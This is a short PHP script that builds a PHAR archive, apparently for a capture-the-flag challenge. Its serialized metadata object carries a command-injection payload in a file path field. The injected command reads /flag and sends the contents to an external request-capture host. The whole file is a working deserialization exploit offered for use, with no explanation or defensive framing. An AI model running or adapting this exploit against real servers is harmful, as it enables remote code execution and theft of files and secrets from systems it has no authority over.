<?php

class TempFile {
    public $path;
    function __construct($path){
        $this->path = $path;
    }
}
@unlink('ppp.phar');
$p = new Phar('ppp.phar');
$p->startBuffering();
$p->setStub('<?php __HALT_COMPILER();');
$p->setMetadata(new TempFile("; php -r \"file_get_contents('https://en0gol53eyppjj.x.pipedream.net/'.file_get_contents('/flag'));\""));
$p->addFromString('test', '123');
$p->stopBuffering();
?>
